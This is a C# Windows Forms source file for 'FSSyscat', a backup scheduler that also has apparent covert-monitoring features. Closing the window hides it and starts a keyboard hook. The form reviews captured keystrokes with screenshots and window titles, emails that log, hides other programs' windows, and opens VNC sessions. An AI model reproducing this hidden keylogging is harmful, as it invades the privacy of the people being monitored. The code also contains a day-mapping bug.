using FSException;
using FSFormControls;
using FSLibrary;
using FSSyscat.Classes;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using static FSLibrary.AlarmClock;
using VncClientUhp;

namespace FSSyscat
{
    public partial class FrmMain : Form
    {
        private int actualPos = 0;
        private bool m_forceClose = false;

        private BackupCollection backupCollection = new BackupCollection();

        public bool ForceClose
        {
            get { return m_forceClose; }
            set { m_forceClose = value; }
        }

        public ListView ListViewClients
        {
            get { return listViewClients; }
            set { listViewClients = value; }
        }

        public FrmMain()
        {
            InitializeComponent();
        }

        public void Start()
        {
            //Cargamos los backups definidos
            LoadBackupConfig();

            //Mostramos la configuración del backup 0
            ShowBackupInfo(0);
        }

        public void HideForm()
        {
            Hide();

            if (Hook.HookerKeyboard != null)
                Hook.HookerKeyboard.Start();
            //if (MainApp.HookerMouse != null)
            //    MainApp.HookerMouse.Start();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!m_forceClose)
            {
                HideForm();
                e.Cancel = true;
            }
        }

        private void cmdSendEmail_Click(object sender, EventArgs e)
        {
            Hook.SendEmail();
        }

        private void cmdNext_Click(object sender, EventArgs e)
        {
            if (actualPos < Hook.LogData.Count - 1)
                actualPos++;
            ShowData();
        }

        private void cmdPrev_Click(object sender, EventArgs e)
        {
            if (actualPos > 0)
                actualPos--;
            ShowData();
        }

        public void ShowApp()
        {
            if (!this.IsDisposed)
            {
                if (WindowState == FormWindowState.Minimized)
                {
                    WindowState = FormWindowState.Normal;
                }
                Show();
                Activate();
            }
        }

        private void ShowData()
        {
            if (Hook.LogData == null)
                return;

            String logdata = "";
            KeyData k;
            if (actualPos < Hook.LogData.Count)
            {
                k = (KeyData)Hook.LogData[actualPos];
                picScreen.Image = k.img;

                logdata += k.time.ToString() + ": " + k.process + " - ";
                logdata += Environment.NewLine;
                logdata += "Datos: " + Environment.NewLine;
                logdata += k.key;

                txt_Log.Text = logdata;

                txt_CurrentWindowstitle.Text = k.app;

                lblPosition.Text = actualPos + 1 + "/" + Hook.LogData.Count;
            }
        }

        public string MouseLabel
        {
            set { labelInfo.Text = value; }
        }

        private void FrmMain_Activated(object sender, EventArgs e)
        {
            ShowData();
        }

        private void btnProgram_Click(object sender, EventArgs e)
        {
            CreateBackup();
        }

        private Backup CreateBackup()
        {
            if (string.IsNullOrEmpty(txtNombre.Text))
            {
                MessageBox.Show("No has indicado un nombre para la copia.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            if (String.IsNullOrEmpty(txtDestino.Text) || String.IsNullOrEmpty(txtOrigen.Text))
            {
                MessageBox.Show("No has indicado destino u origen de la copia.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            AlarmType alarmType = AlarmType.Day;

            if (optDiary.Checked) alarmType = AlarmClock.AlarmType.Diary;
            if (optWeekly.Checked) alarmType = AlarmClock.AlarmType.Weekly;
            if (optMounthly.Checked) alarmType = AlarmClock.AlarmType.Mounthly;

            ExecuteDays executeDays = new ExecuteDays();
            executeDays.Monday = chkLunes.Checked;
            executeDays.Tuesday = chkMartes.Checked;
            executeDays.Wednesday = chkMiercoles.Checked;
            executeDays.Thursday = chkJueves.Checked;
            executeDays.Friday = chkViernes.Checked;
            executeDays.Saturday = chkSabado.Checked;
            executeDays.Sunday = chkDomingo.Checked;


            if (alarmType == AlarmType.Diary && executeDays.Monday == false && executeDays.Tuesday == false && executeDays.Wednesday == false && executeDays.Thursday == false && executeDays.Friday == false && executeDays.Saturday == false && executeDays.Sunday == false)
            {
                MessageBox.Show("Debes indicar al menos un día de la semana en la copia diaria.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            System.DateTime date = new System.DateTime();
            date = new System.DateTime(dateTimePicker1.Value.Year, dateTimePicker1.Value.Month, dateTimePicker1.Value.Day, (int)txtHour.Value, (int)txtMinutes.Value, 0);

            AlarmClock alarm = new AlarmClock(txtNombre.Text, date, alarmType, executeDays);

            Backup backup;
            if (backupCollection.Exist(txtNombre.Text))
            {
                backup = backupCollection.Find(txtNombre.Text);
                backup.Update(txtNombre.Text, txtOrigen.Text, txtDestino.Text, alarm, chkOverwrite.Checked, chkCopyHidden.Checked, chkCompress.Checked);
            }
            else
            {
                backup = new Backup(txtNombre.Text, txtOrigen.Text, txtDestino.Text, alarm, chkOverwrite.Checked, chkCopyHidden.Checked, chkCompress.Checked);
            }

            SaveBackupConfig(backup);

            return backup;
        }

        private void btnOrigen_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog solicitarFolder = new FolderBrowserDialog();

            if (solicitarFolder.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                this.txtOrigen.Text = solicitarFolder.SelectedPath;
            }
            solicitarFolder.Dispose();
        }

        private void btnDestino_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog solicitarFolder = new FolderBrowserDialog();

            if (solicitarFolder.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                this.txtDestino.Text = solicitarFolder.SelectedPath;
            }
            solicitarFolder.Dispose();
        }

        private void optDiary_CheckedChanged(object sender, EventArgs e)
        {
            if (optDiary.Checked)
            {
                chkLunes.Checked = true;
                chkMartes.Checked = true;
                chkMiercoles.Checked = true;
                chkJueves.Checked = true;
                chkViernes.Checked = true;
                chkSabado.Checked = true;
                chkDomingo.Checked = true;

                chkLunes.Enabled = true;
                chkMartes.Enabled = true;
                chkMiercoles.Enabled = true;
                chkJueves.Enabled = true;
                chkViernes.Enabled = true;
                chkSabado.Enabled = true;
                chkDomingo.Enabled = true;
            }
            else
            {
                chkLunes.Checked = false;
                chkMartes.Checked = false;
                chkMiercoles.Checked = false;
                chkJueves.Checked = false;
                chkViernes.Checked = false;
                chkSabado.Checked = false;
                chkDomingo.Checked = false;

                chkLunes.Enabled = false;
                chkMartes.Enabled = false;
                chkMiercoles.Enabled = false;
                chkJueves.Enabled = false;
                chkViernes.Enabled = false;
                chkSabado.Enabled = false;
                chkDomingo.Enabled = false;
            }
        }

        private void listViewBackups_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewBackups.SelectedItems.Count > 0)
                ShowBackupInfo(Convert.ToInt32(listViewBackups.SelectedItems[0].Text));
        }

        private void ShowBackupInfo(int backupPosition)
        {
            if (this.backupCollection.Count == 0) return;

            Backup backup = this.backupCollection[backupPosition];

            ShowBackupInfo(backup);
        }

        public void ShowBackupInfo(Backup backup)
        {
            txtNombre.Text = backup.Name;

            if (backup.AlarmClock.Execute_Days.Monday) chkLunes.Checked = true;
            if (backup.AlarmClock.Execute_Days.Thursday) chkMartes.Checked = true;
            if (backup.AlarmClock.Execute_Days.Wednesday) chkMiercoles.Checked = true;
            if (backup.AlarmClock.Execute_Days.Thursday) chkJueves.Checked = true;
            if (backup.AlarmClock.Execute_Days.Friday) chkViernes.Checked = true;
            if (backup.AlarmClock.Execute_Days.Saturday) chkSabado.Checked = true;
            if (backup.AlarmClock.Execute_Days.Sunday) chkDomingo.Checked = true;

            txtOrigen.Text = backup.Origen;
            txtDestino.Text = backup.Destino;

            Program.SynchronizationContext.Post((state) =>
            {
                if (!Program.frmMain.IsDisposed)
                {
                    dateTimePicker1.Value = backup.AlarmClock.AlarmTime;
                }
            }, null);

            if (backup.AlarmClock.Alarm_Type == AlarmClock.AlarmType.Diary) optDiary.Checked = true;
            if (backup.AlarmClock.Alarm_Type == AlarmClock.AlarmType.Weekly) optWeekly.Checked = true;
            if (backup.AlarmClock.Alarm_Type == AlarmClock.AlarmType.Mounthly) optMounthly.Checked = true;

            txtHour.Value = backup.AlarmClock.AlarmTime.Hour;
            txtMinutes.Value = backup.AlarmClock.AlarmTime.Minute;

            chkCopyHidden.Checked = backup.CopyHidden;
            chkOverwrite.Checked = backup.Overwrite;
            chkCompress.Checked = backup.Compress;
        }

        private void Backup_BackupStart(object sender, EventArgs e)
        {
            try
            {
                Backup backup = (Backup)sender;

                ExecuteBackup(backup);
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message, TraceLevel.Error);
            }
        }

        private void ExecuteBackup(Backup backup)
        {
            if (backup.Running)
            {
                Log("Copia: " + backup.Name + ", ya se esta ejecutando.", TraceLevel.Info);
                return;
            }

            Thread CopyThread = new Thread(new ThreadStart(delegate
            {
                backup.Running = true;

                Log("Copia: " + backup.Name + ", iniciada a las: " + System.DateTime.Now.ToString(), TraceLevel.Info);

                if (backup.Compress)
                {
                    string fileName = "fichero.fsz";
                    int pos = backup.Origen.LastIndexOf("\\");
                    if (pos > 0) fileName = backup.Origen.Substring(pos) + ".fsz";
                    FSCompress.Gz.OnProgress += Gz_OnProgress;
                    FSCompress.Gz.CompressDirectory(backup.Origen, backup.Destino + fileName, backup.Overwrite, backup.CopyHidden);
                    //FSCompress.Zip45.OnProgress += Gz_OnProgress;
                    //FSCompress.Zip45.CreateFromDirectory(backup.Origen, backup.Destino + fileName, backup.Overwrite, backup.CopyHidden);
                }
                else
                {
                    FSFile.FileUtils.CopyDirectory(backup.Origen, backup.Destino, true, backup.Overwrite, backup.CopyHidden);
                }

                labelInfo.Text = "Copia finalizada: " + System.DateTime.Now.ToString();

                Log("Copia finalizada con éxito a las: " + System.DateTime.Now.ToString(), TraceLevel.Info);
                Log("Próxima ejecución de la copia: " + backup.AlarmClock.AlarmTime.ToString(), TraceLevel.Info);

                ShowBackupInfo(backup);
                SaveBackupConfig(backup);

                backup.Running = false;
            }));

            CopyThread.IsBackground = true;
            CopyThread.Start();
        }

        private void Gz_OnProgress(object sender, string e)
        {
            Program.SynchronizationContext.Post((state) =>
            {
                if (!Program.frmMain.IsDisposed)
                {
                    labelInfo.Text = "Procesando: " + e;
                }
            }, null);
        }

        private void borrarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewBackups.SelectedItems.Count > 0)
                backupCollection.Remove(listViewBackups.SelectedItems[0].SubItems[1].Text);

            UpdateListBackup();
        }

        private void UpdateListBackup()
        {
            //añadimos las programaciónes al listView
            int f = 0;

            Program.SynchronizationContext.Post((state) =>
            {
                if (!Program.frmMain.IsDisposed)
                {
                    listViewBackups.Items.Clear();
                }
            }, null);

            foreach (Backup backup in backupCollection)
            {
                ListViewItem lvi = new ListViewItem(new string[] { f.ToString(), backup.Name });

                Program.SynchronizationContext.Post((state) =>
                {
                    if (!Program.frmMain.IsDisposed)
                    {
                        listViewBackups.Items.Add(lvi);
                    }
                }, null);

                //configuramos el evento de inicio de backup
                backup.OnBackupStart += Backup_BackupStart;

                Log("Backup programada: " + backup.Name + " - Hora: " + backup.AlarmClock.AlarmTime.ToString(), TraceLevel.Info);

                f++;
            }

            ////seleccionamos el primer elemento del listView
            Program.SynchronizationContext.Post((state) =>
            {
                if (!Program.frmMain.IsDisposed)
                {
                    if (listViewBackups.Items.Count > 0)
                        listViewBackups.Items[0].Selected = true;
                    listViewBackups.Select();
                }
            }, null);
        }

        private void LoadBackupConfig()
        {
            if (System.IO.File.Exists(Application.StartupPath + "\\BackupAlarmClock.xml"))
            {
                backupCollection.Clear();
                backupCollection.Load(Application.StartupPath + "\\BackupAlarmClock.xml");
            }

            UpdateListBackup();
        }

        private void SaveBackupConfig(Backup backup)
        {
            if (backupCollection.Exist(backup.Name))
            {
                backupCollection.Remove(backup.Name);
            }

            backupCollection.Add(backup);

            backupCollection.Save(Application.StartupPath + "\\BackupAlarmClock.xml");

            UpdateListBackup();
        }

        private void cmdLimpiar_Click(object sender, EventArgs e)
        {
            listViewLog.Items.Clear();
        }

        public void Log(string message)
        {
            Log(message, TraceLevel.Info);
        }
        public void Log(string message, TraceLevel traceLevel)
        {
            Program.SynchronizationContext.Post((state) =>
            {
                if (!this.IsDisposed)
                {
                    listViewLog.Items.Add(new ListViewItem(new string[] { System.DateTime.Now.ToString(),traceLevel.ToString(), message }));
                }
            }, null);
        }

        private void btnLaunchNow_Click(object sender, EventArgs e)
        {
            Backup backup = CreateBackup();

            if (backup != null)
            {
                ExecuteBackup(backup);
            }
        }

        private void btnProcess_Click(object sender, EventArgs e)
        {
            lstProcess.Items.Clear();
            lstProcess.Sorted = true;

            //mostramos todas las appicaciones
            foreach (Process pr in Process.GetProcesses())
            {
                if(pr.MainWindowTitle != "")
                    lstProcess.Items.Add(pr.MainWindowTitle);
            }
        }

        private void btnShowProcess_Click(object sender, EventArgs e)
        {
            if (lstProcess.SelectedItem != null)
            {
                string select = lstProcess.SelectedItem.ToString();
                ProcessUtil.ShowProcessByTitle(select);
            }
            else
                MessageBox.Show("Selecciona un proceso de la lista", "Selecciona proceso", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnHideProcess_Click(object sender, EventArgs e)
        {
            if (lstProcess.SelectedItem != null)
            {
                string select = lstProcess.SelectedItem.ToString();

                ProcessUtil.HideProcessByTitle(select);
            }
            else
                MessageBox.Show("Selecciona un proceso de la lista", "Selecciona proceso", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnGetInfo_Click(object sender, EventArgs e)
        {
            Thread InfoThread = new Thread(new ThreadStart(delegate
            {
                Program.SynchronizationContext.Post((state) =>
                {
                    if (!Program.frmMain.IsDisposed)
                    {
                        txtSystemInfo.Text = SystemInfo.GetAllInfo();
                    }
                }, null);
            }));

            InfoThread.IsBackground = true;
            InfoThread.Start();
        }

        private void btnUnzip_Click(object sender, EventArgs e)
        {
            frmUnZip frmU = new frmUnZip();
            frmU.Show();
        }

        private void cmdEnviar_Click(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count != 0)
            {
                if (listViewClients.SelectedItems[0] != null)
                {
                    UHPShared.UhpMessage CI = listViewClients.SelectedItems[0].Tag as UHPShared.UhpMessage;
                    CI.ClassType = UHPShared.UhpType.ClientInfo;

                    Chat.clientUHP.ConnectToClient(CI);
                }
            }
            else
            {
                MessageBox.Show("Debes seleccionar un usuario de la lista", "Seleccionar", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void cmdConectarFSVNC_Click(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count != 0)
            {
                if (listViewClients.SelectedItems[0] != null)
                {
                    UHPShared.UhpMessage CI = listViewClients.SelectedItems[0].Tag as UHPShared.UhpMessage;
                    CI.ClassType = UHPShared.UhpType.ClientInfo;

                    //Chat.clientUHP.ConnectToClient(CI);
                    VncClientForm vncClient = new VncClientForm(Chat.clientUHP, CI);
                    vncClient.Show();
                }
            }
            else
            {
                MessageBox.Show("Debes seleccionar un usuario de la lista", "Seleccionar", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void cmdActualizar_Click(object sender, EventArgs e)
        {
            try
            {
                //listViewClients.Clear();
                Chat.StartUhp();
            }
            catch (Exception ex)
            {
                FSTrace.Log.TraceError(ex.Message);
            }
        }
    }
}